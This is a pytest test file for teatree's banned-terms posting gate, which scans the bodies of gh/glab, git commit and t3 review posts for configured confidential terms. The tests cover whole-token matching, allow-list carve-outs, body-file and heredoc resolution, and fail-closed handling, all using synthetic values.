"""Tests for the banned-terms posting gate (#1415).

The detection module ``teatree.hooks.banned_terms_scanner`` and its
PreToolUse handler ``handle_banned_terms_pretool`` together promote the
commit-only ``check-banned-terms.sh`` hook to the non-commit posting
surfaces (``gh issue/pr create|edit|comment``, ``glab mr|issue
note|create``, the ``gh api`` / ``glab api`` REST paths). It is the
sibling of the #1213 quote-scanner gate: it reuses the exact same
``_command_parser`` publish-surface detection + body extraction, then
delegates the *matching* to the existing ``check-banned-terms.sh``
against the ``~/.teatree.toml`` term list — it does NOT reimplement
matching.

These tests exercise the gate via real hook invocation: a clean body
passes, a banned-term body blocks, ``--body-file`` is read from disk.
"""

import json
import os
import subprocess
from pathlib import Path

import pytest

import hooks.scripts.hook_router as router
from hooks.scripts.hook_router import handle_banned_terms_pretool
from teatree.hooks import _command_parser, _repo_visibility, banned_terms_scanner
from teatree.hooks._command_parser import (
    FAIL_CLOSED_SENTINEL,
    UNAVAILABLE_BODY_SOURCE_SENTINEL,
    is_unavailable_body_source_sentinel,
)
from teatree.hooks.banned_terms_scanner import format_unavailable_body_source_message


@pytest.fixture
def config(tmp_path: Path) -> Path:
    """A ``~/.teatree.toml`` shaped config carrying one banned term.

    Also declares the private-repo allowlist used by the #126 carve-out
    tests; the banned-terms scanner ignores the extra key.
    """
    cfg = tmp_path / ".teatree.toml"
    cfg.write_text(
        "[teatree]\n"
        'banned_terms = ["acmecorp"]\n'
        'private_repos = ["acmecorp-engineering"]\n'
        'internal_publish_namespaces = ["internalcorp", "acme-internal"]\n',
        encoding="utf-8",
    )
    return cfg


@pytest.fixture(autouse=True)
def _pin_config(config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Point the scanner at the test config instead of the real one."""
    monkeypatch.setenv("T3_BANNED_TERMS_CONFIG", str(config))


@pytest.fixture(autouse=True)
def _confirm_public_probe(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # The leak gate enforces ONLY on an affirmatively-PUBLIC target (#1415), so the
    # must-BLOCK rows post to a resolvable target the probe confirms public. The
    # config-allowlisted (``private_repos``) and internal-namespace targets resolve
    # NON-public BEFORE the probe, so their must-SKIP rows are unaffected by this
    # pin. Isolate the visibility cache so a stale entry never masks the pin. A
    # per-test ``probe_visibility`` setattr (the commit-path visibility rows)
    # overrides this default.
    monkeypatch.setenv("T3_DATA_DIR", str(tmp_path / "viscache"))
    monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")


def _bash(command: str) -> dict[str, object]:
    return {"tool_name": "Bash", "tool_input": {"command": command}}


def _git(cwd: Path, *args: str) -> None:
    subprocess.run(
        ["git", *args],  # noqa: S607
        cwd=cwd,
        check=True,
        capture_output=True,
        env={**os.environ, "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null"},
    )


def _private_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-b", "main")
    _git(repo, "remote", "add", "origin", "git@gitlab.com:acmecorp-engineering/product.git")
    return repo


def _public_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "public-repo"
    repo.mkdir()
    _git(repo, "init", "-b", "main")
    _git(repo, "remote", "add", "origin", "git@github.com:souliane/teatree.git")
    return repo


class TestScanText:
    def test_banned_term_is_matched(self, config: Path) -> None:
        term = banned_terms_scanner.scan_text("we ship to acmecorp next week", config_path=config)
        assert term == "acmecorp"

    def test_clean_text_returns_none(self, config: Path) -> None:
        assert banned_terms_scanner.scan_text("we ship next week", config_path=config) is None

    def test_match_is_case_insensitive(self, config: Path) -> None:
        # All-caps keeps it a single token (no camelCase boundary) so this
        # isolates case-insensitivity rather than the camelCase split.
        assert banned_terms_scanner.scan_text("ACMECORP ships", config_path=config) == "acmecorp"

    def test_email_only_match_is_ignored(self, config: Path) -> None:
        # Mirrors check-banned-terms.sh: a term only inside an email is allowed.
        text = "ping me at dev@acmecorp.example for details"
        assert banned_terms_scanner.scan_text(text, config_path=config) is None

    def test_empty_text_returns_none(self, config: Path) -> None:
        assert banned_terms_scanner.scan_text("", config_path=config) is None

    def test_missing_config_returns_none(self, tmp_path: Path) -> None:
        assert banned_terms_scanner.scan_text("acmecorp", config_path=tmp_path / "absent.toml") is None

    def test_fail_closed_sentinel_blocks(self, config: Path) -> None:
        # An unresolvable body (the sentinel) is not a configured term, so
        # delegating it to check-banned-terms.sh would clear it; it must BLOCK,
        # mirroring the quote / bare-reference sibling scanners.
        assert banned_terms_scanner.scan_text(FAIL_CLOSED_SENTINEL, config_path=config) is not None

    def test_fail_closed_sentinel_blocks_even_without_config(self, tmp_path: Path) -> None:
        assert banned_terms_scanner.scan_text(FAIL_CLOSED_SENTINEL, config_path=tmp_path / "absent.toml") is not None


class TestWholeTokenMatching:
    """The posting gate matches whole tokens, not substrings (over-block fix).

    A short configured term must not surface inside a longer unbroken word
    (the real failing case was a short term blocking a longer English word
    that merely contained it). The synthetic ``acme`` term proves the same
    class of bug without naming any real customer/overlay value.
    """

    @pytest.fixture
    def short_term_config(self, tmp_path: Path) -> Path:
        cfg = tmp_path / ".teatree.toml"
        cfg.write_text('[teatree]\nbanned_terms = ["acme", "acme-corp", "foo_bar"]\n', encoding="utf-8")
        return cfg

    @pytest.mark.parametrize("text", ["a cooperative effort", "pacme builds", "an acmeology lecture"])
    def test_single_word_substring_inside_a_word_does_not_block(self, short_term_config: Path, text: str) -> None:
        # The single-word ``acme`` must not surface inside a longer unbroken word.
        assert banned_terms_scanner.scan_text(text, config_path=short_term_config) is None

    @pytest.mark.parametrize(
        ("text", "expected"),
        # camelCase/Pascal split + lowercase-glued fallback for multi-word terms.
        [
            ("acmecorp ships next week", "acme-corp"),
            ("the acmeCorp service", "acme"),
            ("the AcmeCorp service", "acme"),
            ("a fooBar value", "foo_bar"),
        ],
    )
    def test_camelcase_and_glued_multiword_blocks(self, short_term_config: Path, text: str, expected: str) -> None:
        assert banned_terms_scanner.scan_text(text, config_path=short_term_config) == expected

    @pytest.mark.parametrize(
        ("text", "expected"),
        [
            ("rolling out acme today", "acme"),
            ("see x-acme-y in the diff", "acme"),
            ("Acme, hi there", "acme"),
            # ``acme`` is the first configured term and is a whole token of
            # ``acme-corp``, so it is the one reported — the block still fires.
            ("the acme-corp account", "acme"),
            ("set foo_bar = 1", "foo_bar"),
            ("the foo bar value", "foo_bar"),
        ],
    )
    def test_whole_token_run_blocks(self, short_term_config: Path, text: str, expected: str) -> None:
        assert banned_terms_scanner.scan_text(text, config_path=short_term_config) == expected

    def test_isolated_multi_token_term_blocks_and_is_reported(self, tmp_path: Path) -> None:
        cfg = tmp_path / ".teatree.toml"
        cfg.write_text('[teatree]\nbanned_terms = ["acme-corp"]\n', encoding="utf-8")
        assert banned_terms_scanner.scan_text("the acme-corp account", config_path=cfg) == "acme-corp"


class TestCompanyIdentifierAllowlistGate:
    """#1415 over-block: a short org slug must not fire inside a company identifier.

    A short org-slug term must not fire inside the company's OWN compound
    identifiers / internal URLs, via the ``banned_terms_allowlist`` carve-out.

    The recurring false positive: a single-token org slug (``acme`` here, the
    synthetic stand-in for the real org slug) is also a sub-token of every
    company-owned identifier (``acme-engineering`` / ``acme-product``) and of an
    internal-URL path, so it fired on EVERY one of the company's own MR/post
    bodies. The ``banned_terms_allowlist`` carve-out blanks the allow-listed
    identifier's token-run BEFORE matching, so the short term no longer surfaces
    inside it — while a genuine customer codename NOT on the allow-list is STILL
    blocked, proving the carve-out does not gut the gate. All values are
    SYNTHETIC neutral fakes.

    These run the FULL gate (``scan_text`` → ``check-banned-terms.sh`` →
    ``term_match`` with the TOML allow-list), so they pin the end-to-end seam.
    """

    @pytest.fixture
    def config(self, tmp_path: Path) -> Path:
        cfg = tmp_path / ".teatree.toml"
        cfg.write_text(
            "[teatree]\n"
            'banned_terms = ["acme", "customercodename", "acme-engineering", "acme-product"]\n'
            'banned_terms_allowlist = ["acme-engineering", "acme-product", "acme-client-workspace"]\n',
            encoding="utf-8",
        )
        return cfg

    @pytest.mark.parametrize(
        "body",
        [
            "See https://gitlab.example/acme-engineering/acme-product/-/merge_requests/123",
            "relates to the acme-product change",
            "the acme-engineering team owns this",
            "moved to acme-client-workspace",
            "see acmeEngineering and acmeProduct",  # camelCase company identifiers
        ],
    )
    def test_company_identifier_body_passes_the_gate(self, config: Path, body: str) -> None:
        # RED before the fix (``acme`` blocked); GREEN after (carve-out blanks
        # the allow-listed identifier so ``acme`` never surfaces inside it).
        assert banned_terms_scanner.scan_text(body, config_path=config) is None

    def test_real_customer_codename_still_blocked(self, config: Path) -> None:
        # CONTROL: a genuine customer codename NOT on the allow-list is STILL
        # blocked — the fix did not gut the gate.
        assert banned_terms_scanner.scan_text("affects the customercodename tenant", config_path=config) == (
            "customercodename"
        )

    def test_customer_codename_blocks_beside_company_identifier(self, config: Path) -> None:
        body = "acme-product change for the customercodename tenant"
        assert banned_terms_scanner.scan_text(body, config_path=config) == "customercodename"

    def test_bare_org_slug_token_still_blocked(self, config: Path) -> None:
        # A standalone org-slug token NOT part of a company identifier still
        # fires — the carve-out exempts the compound identifiers, not the slug.
        assert banned_terms_scanner.scan_text("the acme value here", config_path=config) == "acme"

    def test_no_allowlist_preserves_over_block(self, tmp_path: Path) -> None:
        # Without the allow-list key the prior behaviour is unchanged: the short
        # term DOES surface inside the company identifier (the bug, opt-in fix).
        cfg = tmp_path / ".teatree.toml"
        cfg.write_text('[teatree]\nbanned_terms = ["acme", "acme-product"]\n', encoding="utf-8")
        assert banned_terms_scanner.scan_text("the acme-product repo", config_path=cfg) == "acme"


class TestMatchedTermAttribution:
    """``_matched_term`` attributes by whole-token match, never substring.

    A flagged line that contains a longer word must not be attributed to a
    short term that is merely its substring.
    """

    def test_attribution_is_not_a_substring_coincidence(self) -> None:
        # ``wid`` is a substring of ``widget`` but is NOT a whole token in the
        # flagged line, so the real whole-token term is reported instead.
        report = "BANNED TERM in /tmp/x.txt:\n  1:the acme widget shipped\n\nBanned terms: wid, acme\n"
        assert banned_terms_scanner._matched_term(report) == "acme"


class TestExtractSecretScanSurfaces:
    def test_title_long_flag_secret_is_surfaced(self) -> None:
        secret = "ghp_" + "A" * 40
        text = _command_parser.extract_secret_scan_text(f'gh pr create -R souliane/teatree --title "{secret}"')
        assert secret in text

    def test_short_title_flag_secret_is_surfaced(self) -> None:
        secret = "ghp_" + "A" * 40
        text = _command_parser.extract_secret_scan_text(f'gh pr create -R souliane/teatree -t "{secret}"')
        assert secret in text

    def test_api_non_body_field_secret_is_surfaced(self) -> None:
        secret = "ghp_" + "A" * 40
        text = _command_parser.extract_secret_scan_text(f"gh api repos/souliane/teatree/issues -f title={secret}")
        assert secret in text


class TestIsPublishCommandTokenAware:
    def test_api_after_interspersed_persistent_flag(self) -> None:
        assert _command_parser.is_publish_command("gh --hostname github.com api repos/o/r/issues -f body=x")

    def test_api_after_interspersed_method_flag(self) -> None:
        assert _command_parser.is_publish_command("gh -X POST api repos/o/r/issues -f body=x")

    def test_git_c_commit_is_detected(self) -> None:
        assert _command_parser.is_publish_command('git -C /some/dir commit -m "msg"')

    def test_git_global_dir_commit_long_message_is_detected(self) -> None:
        assert _command_parser.is_publish_command('git --git-dir=/x/.git --work-tree=/x commit --message "msg"')

    def test_flagless_git_commit_is_not_a_publish_surface(self) -> None:
        assert not _command_parser.is_publish_command("git -C /some/dir commit")

    def test_plain_non_publish_command_stays_false(self) -> None:
        assert not _command_parser.is_publish_command("git -C /some/dir status")


class TestApiEffectiveMethodCorpus:
    """`gh`/`glab api` is classified by EFFECTIVE HTTP method, not bare substring (#1530).

    A read-only `api` call (effective GET/HEAD) is NOT a publish, so the
    destination-aware gates no longer over-block it; an `api` WRITE (effective
    POST/PATCH/PUT/DELETE, last-wins on repeated `-X`/`--method`) stays a publish
    surface the body walkers must scan.
    """

    @pytest.mark.parametrize(
        "command",
        [
            # Bare reads — no method flag, no body flag → default GET.
            "gh api user",
            "gh api repos/o/r/commits/main",
            "glab api projects/42/merge_requests",
            # Explicit GET, even alongside a `-f` query param (#1568): a forced
            # GET sends `-f` as a query param, never a body write.
            "gh api repos/o/r/issues --method GET",
            "gh api repos/o/r/issues -X GET -f state=open",
            "glab api projects/42/issues --method=GET -f per_page=100",
            # No-space explicit GET forces a read.
            "gh api repos/o/r/issues -XGET -f state=open",
            # Repeated method flags, GET LAST → effective GET → read.
            "gh api repos/o/r/issues -X POST -X GET",
            # HEAD is a read.
            "gh api repos/o/r -X HEAD",
        ],
    )
    def test_read_only_api_is_not_a_publish(self, command: str) -> None:
        assert not _command_parser.is_publish_command(command)

    @pytest.mark.parametrize(
        "command",
        [
            # Body flag with no method → gh/glab default to POST → write.
            "gh api repos/o/r/issues -f title=bug -f body=x",
            "glab api projects/42/issues --field body=x",
            # Explicit write methods.
            "gh api repos/o/r/issues -X POST -f body=x",
            "gh api repos/o/r/issues/1 --method PATCH -f body=x",
            "glab api projects/42/merge_requests/7/notes -X PUT -f body=x",
            "gh api repos/o/r/issues/1 -X DELETE",
            # No-space write shorthand.
            "glab api projects/42/issues -XPOST -f body=x",
            # Repeated method flags, write LAST → effective write.
            "gh api repos/o/r/issues -X GET -X POST -f body=x",
            # Interspersed persistent flag before `api` still detected as write.
            "gh --hostname github.com api repos/o/r/issues -f body=x",
        ],
    )
    def test_write_api_stays_a_publish(self, command: str) -> None:
        assert _command_parser.is_publish_command(command)

    @pytest.mark.parametrize(
        "command",
        [
            "gh pr view 12",
            "gh pr list --state open",
            "gh pr diff 12",
            "gh repo view o/r",
        ],
    )
    def test_gh_pr_reads_are_not_a_publish(self, command: str) -> None:
        assert not _command_parser.is_publish_command(command)


class TestExtractPublishPayload:
    def test_gh_issue_create_body_is_extracted(self) -> None:
        payload = banned_terms_scanner.extract_publish_payload(
            "Bash", {"command": 'gh issue create --title t --body "ship to acmecorp"'}
        )
        assert payload is not None
        assert "acmecorp" in payload

    def test_non_publish_command_returns_none(self) -> None:
        assert banned_terms_scanner.extract_publish_payload("Bash", {"command": "ls -la"}) is None

    def test_non_bash_tool_returns_none(self) -> None:
        assert banned_terms_scanner.extract_publish_payload("Write", {"command": "x"}) is None

    def test_body_file_is_read_from_disk(self, tmp_path: Path) -> None:
        body_file = tmp_path / "body.md"
        body_file.write_text("internal note about acmecorp\n", encoding="utf-8")
        payload = banned_terms_scanner.extract_publish_payload(
            "Bash", {"command": f"gh pr create --title t --body-file {body_file}"}
        )
        assert payload is not None
        assert "acmecorp" in payload


class TestT3ReviewPostBodyIsPositionalNote:
    """``t3 review post-comment`` / ``post-draft-note`` body is the positional NOTE.

    Both verbs carry the body as the positional ``NOTE`` argument (``review
    <verb> REPO MR NOTE``), not a ``--body``/``--message`` flag. The body
    extractor's flag walkers found no body flag, so a clean general note's body
    was never extracted (a banned term in it slipped through unscanned, #2278
    Bug 1 / #2270) and the inline ``--file`` anchor was treated as a body-file
    (the anchored SOURCE was scanned instead of the note, #2278 Bug 2).
    """

    def _payload(self, command: str) -> str | None:
        return banned_terms_scanner.extract_publish_payload("Bash", {"command": command})

    def test_general_note_positional_body_is_extracted(self) -> None:
        payload = self._payload('t3 teatree review post-comment my-org/repo 7 "clean general note" --general')
        assert payload is not None
        assert "clean general note" in payload

    def test_general_note_banned_positional_body_is_surfaced(self) -> None:
        # Bug 1 / #2270 RED guard: a banned term in the POSITIONAL body must be
        # in the extracted payload so the scanner can block it. Pre-fix the
        # payload was empty and the term slipped through.
        payload = self._payload(
            't3 teatree review post-comment my-org/repo 7 "this names acmecorp internally" --general'
        )
        assert payload is not None
        assert "acmecorp" in payload

    def test_post_draft_note_general_banned_positional_body_is_surfaced(self) -> None:
        payload = self._payload('t3 teatree review post-draft-note my-org/repo 7 "acmecorp wants this" --general')
        assert payload is not None
        assert "acmecorp" in payload

    def test_inline_note_body_is_the_note_not_the_anchor_source(self, tmp_path: Path) -> None:
        # Bug 2 RED guard: the inline ``--file`` anchor points at a SOURCE that
        # happens to contain a banned substring. The published body is the NOTE,
        # so the source content must NOT be in the extracted payload. Pre-fix
        # ``--file`` was treated as a body-file and the source was scanned.
        source = tmp_path / "module.py"
        source.write_text("# internal wiring for acmecorp\nx = 1\n", encoding="utf-8")
        payload = self._payload(
            f't3 teatree review post-comment my-org/repo 7 "clean review note" --file {source} --line 1'
        )
        assert payload is not None
        assert "clean review note" in payload
        assert "acmecorp" not in payload

    def test_inline_note_with_missing_anchor_source_does_not_fail_closed(self) -> None:
        # Bug 2 fail-close RED guard: a non-existent ``--file`` anchor must not
        # make the gate fail closed — the body is the NOTE, which is readable.
        payload = self._payload(
            't3 teatree review post-comment my-org/repo 7 "clean review note" --file src/absent_module.py --line 3'
        )
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert "clean review note" in payload

    def test_inline_note_banned_positional_body_is_surfaced(self, tmp_path: Path) -> None:
        # The fix must not weaken detection: a banned term in the NOTE of an
        # inline post (with a clean anchor) must still be surfaced.
        source = tmp_path / "module.py"
        source.write_text("x = 1\n", encoding="utf-8")
        payload = self._payload(
            f't3 teatree review post-comment my-org/repo 7 "acmecorp asked for this" --file {source} --line 1'
        )
        assert payload is not None
        assert "acmecorp" in payload

    def test_dash_leading_note_after_end_of_options_is_surfaced(self) -> None:
        # G1 RED guard: Typer requires ``--`` to pass a positional starting with
        # ``-``. Pre-fix the ``--`` marker and the dash-leading NOTE were both
        # treated as flags, only two positionals were collected, and the banned
        # term in the note slipped through unscanned.
        payload = self._payload('t3 teatree review post-comment my-org/repo 7 -- "--leading-dash acmecorp leak"')
        assert payload is not None
        assert "acmecorp" in payload

    def test_env_prefixed_t3_leader_note_is_surfaced(self) -> None:
        # G2 RED guard: an env-prefixed ``t3`` leader (``FOO=bar t3 ...``) was
        # not recognised as a review post, so the positional NOTE was never
        # extracted and a banned term in it escaped scanning.
        payload = self._payload('FOO=bar t3 teatree review post-comment my-org/repo 7 "acmecorp note"')
        assert payload is not None
        assert "acmecorp" in payload

    def test_lowercase_env_prefixed_t3_leader_note_is_surfaced(self) -> None:
        # A lowercase env name (``foo=bar t3 ...``) is a valid bash assignment.
        # The publish-detection layer strips it with the permissive env-prefix
        # regex and classifies the segment as a review post, so the NOTE
        # extractor must use the SAME permissive regex — an uppercase-only
        # pattern left the leader unresolved and the banned term in the
        # positional NOTE slipped through unscanned.
        payload = self._payload('foo=bar t3 teatree review post-comment my-org/repo 7 "acmecorp note"')
        assert payload is not None
        assert "acmecorp" in payload

    def test_path_form_t3_leader_note_is_surfaced(self) -> None:
        # G2 RED guard: a path-form ``t3`` leader (``./t3``) was not recognised
        # as a review post, so the positional NOTE escaped scanning.
        payload = self._payload('./t3 teatree review post-comment my-org/repo 7 "acmecorp note"')
        assert payload is not None
        assert "acmecorp" in payload


class TestT3ReviewPostBodyFileIsScanned:
    """``t3 review post-comment --body-file <path>`` body is read and scanned (#32).

    #32 adds a ``--body-file`` (and ``-m``/``--body``) source to ``review
    post-comment`` so large MR-thread evidence can be posted through the
    scannable flag path instead of a single shell-quoted positional. The body
    is the FILE the flag points at — NOT the ``--file`` diff anchor (a SOURCE
    path) — so the gate must scan the body file while still skipping the anchor.
    """

    def _payload(self, command: str) -> str | None:
        return banned_terms_scanner.extract_publish_payload("Bash", {"command": command})

    def test_body_file_content_is_extracted(self, tmp_path: Path) -> None:
        body = tmp_path / "evidence.md"
        body.write_text("clean MR-thread evidence\n", encoding="utf-8")
        payload = self._payload(f"t3 teatree review post-comment my-org/repo 7 --body-file {body}")
        assert payload is not None
        assert "clean MR-thread evidence" in payload

    def test_banned_term_in_body_file_is_surfaced(self, tmp_path: Path) -> None:
        # RED guard: a banned term in the BODY FILE must reach the scanner. Pre-#32
        # the t3-review path skipped the body-file walker entirely, so a leak in a
        # ``--body-file`` post slipped through unscanned.
        body = tmp_path / "evidence.md"
        body.write_text("this names acmecorp internally\n", encoding="utf-8")
        payload = self._payload(f"t3 teatree review post-comment my-org/repo 7 --body-file {body}")
        assert payload is not None
        assert "acmecorp" in payload

    def test_body_file_scanned_while_anchor_source_is_not(self, tmp_path: Path) -> None:
        # The ``--file`` diff anchor (a SOURCE) must still be skipped even when a
        # ``--body-file`` body is present: only the body is published.
        anchor = tmp_path / "module.py"
        anchor.write_text("# acmecorp wiring\nx = 1\n", encoding="utf-8")
        body = tmp_path / "evidence.md"
        body.write_text("clean inline review note\n", encoding="utf-8")
        payload = self._payload(
            f"t3 teatree review post-comment my-org/repo 7 --body-file {body} --file {anchor} --line 1"
        )
        assert payload is not None
        assert "clean inline review note" in payload
        assert "acmecorp" not in payload

    def test_unreadable_body_file_fails_closed(self) -> None:
        # A missing ``--body-file`` is an unscannable public body → fail closed.
        payload = self._payload("t3 teatree review post-comment my-org/repo 7 --body-file /nope/absent-body.md")
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload


class TestRelativeBodyFileResolvesAgainstCommandDir:
    """A relative ``--body-file`` resolves against the command's own ``cd`` dir.

    At PreToolUse the cold hook subprocess's cwd has reset away from the
    worktree, so a ``cd <worktree> && gh pr create --body-file body.md`` body
    file is unreadable from the cwd. The gate previously failed closed and
    blocked a clean post; it now resolves the relative path against the
    command's leading ``cd`` dir — clean passes, banned blocks.
    """

    def test_clean_relative_body_file_passes(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        (tmp_path / "body.md").write_text("ship the docs refresh next week\n", encoding="utf-8")
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        monkeypatch.chdir(elsewhere)
        payload = banned_terms_scanner.extract_publish_payload(
            "Bash", {"command": f"cd {tmp_path} && gh pr create --title t --body-file body.md"}
        )
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert "ship the docs refresh" in payload

    def test_banned_relative_body_file_blocks(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        (tmp_path / "body.md").write_text("internal note about acmecorp\n", encoding="utf-8")
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        monkeypatch.chdir(elsewhere)
        payload = banned_terms_scanner.extract_publish_payload(
            "Bash", {"command": f"cd {tmp_path} && gh pr create --title t --body-file body.md"}
        )
        assert payload is not None
        assert "acmecorp" in payload

    # REGRESSION (#1415): a sub-agent's ``git -C <RELATIVE worktree> commit -F
    # <relative body>``. The relative ``-C`` worktree must be anchored on the
    # AMBIENT hook cwd, not the cold hook's process cwd, so the relative body
    # file (read from the worktree the commit lands in) is found and scanned.
    def test_relative_dash_c_commit_body_file_anchored_on_ambient_cwd(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        workspace = tmp_path / "workspace"
        ambient_cwd = workspace / "sibling"
        worktree = workspace / "worktree"
        worktree.mkdir(parents=True)
        ambient_cwd.mkdir()
        _git(worktree, "init", "-q", "-b", "main")
        (worktree / "msg.txt").write_text("internal note about acmecorp\n", encoding="utf-8")
        # Process cwd is OUTSIDE the workspace, so a process-cwd-relative parse
        # cannot find the body -- only the ambient-cwd anchor reaches it.
        process_cwd = tmp_path / "process"
        process_cwd.mkdir()
        monkeypatch.chdir(process_cwd)
        payload = banned_terms_scanner.extract_publish_payload(
            "Bash",
            {"command": "git -C ../worktree commit -F msg.txt"},
            ambient_cwd,
        )
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL not in payload
        assert "acmecorp" in payload


class TestHeredocBodyPairing:
    """A file-redirected heredoc is scanned only when its path is posted.

    The fail-closed banned-terms gate must (a) NOT scan an unposted scratch
    heredoc's body as if it were published (a false hard-block) and (b) STILL
    carry a posted heredoc body's banned term. Covered plain and ``cd``-prefixed.
    """

    def test_unposted_scratch_heredoc_term_does_not_block(self) -> None:
        cmd = (
            "cat > /tmp/scratch-bt.txt <<EOF1\nacmecorp scratch never posted\nEOF1\n"
            "cat > /tmp/posted-bt.txt <<EOF2\nclean release notes\nEOF2\n"
            "gh pr create --repo o/r --title t --body-file /tmp/posted-bt.txt"
        )
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "clean release notes" in payload
        assert "acmecorp" not in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_cd_prefixed_unposted_scratch_heredoc_term_does_not_block(self) -> None:
        cmd = (
            "cd /tmp/wt && cat > /tmp/scratch-bt2.txt <<EOF1\nacmecorp scratch only\nEOF1\n"
            "cat > /tmp/posted-bt2.txt <<EOF2\nclean notes here\nEOF2\n"
            "gh pr create --repo o/r --title t --body-file /tmp/posted-bt2.txt"
        )
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "clean notes here" in payload
        assert "acmecorp" not in payload

    def test_posted_heredoc_path_carries_banned_term(self) -> None:
        cmd = (
            "cat > /tmp/posted-bt3.txt <<EOF\nship to acmecorp\nEOF\n"
            "gh pr create --repo o/r --title t --body-file /tmp/posted-bt3.txt"
        )
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "acmecorp" in payload

    def test_stdin_heredoc_body_still_carries_banned_term(self) -> None:
        cmd = "gh pr create --repo o/r --title t --body-file - <<EOF\nship to acmecorp\nEOF"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "acmecorp" in payload


class TestBodyFileWriteThenPostResolution:
    """An in-command write paired with a later ``--body-file <path>`` resolves.

    A ``printf``/``echo > path`` write paired with a later ``--body-file
    <path>`` in the SAME command resolves to the written body — the file does
    NOT exist on disk at PreToolUse scan time, so the gate must read the body
    from the writer's operands rather than fail closed on every body (the
    indirection-body bug). Safety is preserved: a ``--body-file`` whose body is
    NOT written in-command (a bare shell variable, a missing literal file)
    still fails closed.
    """

    def test_printf_redirect_to_var_path_resolves_clean_body(self) -> None:
        # ``f=$(mktemp); printf '%s' '<clean>' > "$f"; gh ... --body-file "$f"``.
        # The $f token is identical in the write and the reference, so the
        # resolver pairs them even though neither is expanded at scan time.
        cmd = 'f=$(mktemp); printf "%s" "ship next week" > "$f"; gh pr comment 5 --repo o/r --body-file "$f"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "ship next week" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_echo_redirect_to_var_path_resolves_clean_body(self) -> None:
        cmd = 'f=$(mktemp); echo "ship next week" > "$f"; glab mr note create 7 --repo o/r --body-file "$f"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "ship next week" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_attached_redirect_no_space_resolves_clean_body(self) -> None:
        # ``printf '%s' 'x' >"$f"`` — the unspaced redirect lexes as a single
        # glued ``>$f`` token; the target must still pair with --body-file "$f".
        cmd = 'f=$(mktemp); printf "%s" "ship next week" >"$f"; gh pr comment 5 --repo o/r --body-file "$f"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "ship next week" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_append_redirect_resolves_clean_body(self) -> None:
        cmd = 'f=$(mktemp); printf "%s" "ship next week" >> "$f"; gh pr comment 5 --repo o/r --body-file "$f"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "ship next week" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_printf_redirect_to_literal_path_resolves_clean_body(self, tmp_path: Path) -> None:
        body_file = tmp_path / "post-body.txt"
        cmd = f'printf "%s" "ship next week" > {body_file}; gh pr comment 5 --repo o/r --body-file {body_file}'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "ship next week" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_write_then_post_with_banned_term_resolves_and_carries_term(self) -> None:
        # The gate checks the RESOLVED content, so a banned term written via
        # printf and posted via --body-file is surfaced for the matcher.
        cmd = 'f=$(mktemp); printf "%s" "ship to acmecorp" > "$f"; gh pr comment 5 --repo o/r --body-file "$f"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "acmecorp" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

    def test_body_file_var_without_in_command_write_fails_closed(self) -> None:
        # No in-command write to $BODY and no on-disk file — genuinely
        # unresolvable, so the gate must STILL fail closed.
        cmd = 'gh pr comment 5 --repo o/r --body-file "$BODY"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload

    def test_body_file_missing_literal_path_fails_closed(self) -> None:
        cmd = "gh pr comment 5 --repo o/r --body-file /no/such/body-file-xyz.txt"
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert FAIL_CLOSED_SENTINEL in payload


class TestCommandSubstitutionBodyResolution:
    """A ``--description``/``--body`` ``$(cat <path>)`` resolves to the file content.

    Agents pass a body as ``--description "$(cat <path>)"`` (glab) or
    ``--body "$(cat <path>)"`` (gh). The gate previously read the literal
    ``$(cat ...)`` string -- so a clean file was rejected (the literal was
    not the body) and a banned term inside the file slipped through unread.
    The resolver reads the cat'd file so the scan runs against the ACTUAL
    body; an unreadable file fails closed.
    """

    def test_glab_description_cat_subst_resolves_clean_body(self, tmp_path: Path) -> None:
        body = tmp_path / "body.md"
        body.write_text("a clean release note about the docs refresh\n", encoding="utf-8")
        cmd = f'glab mr create -R o/r --title t --description "$(cat {body})"'
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": cmd})
        assert payload is not None
        assert "a clean release note" in payload
        assert FAIL_CLOSED_SENTINEL not in payload

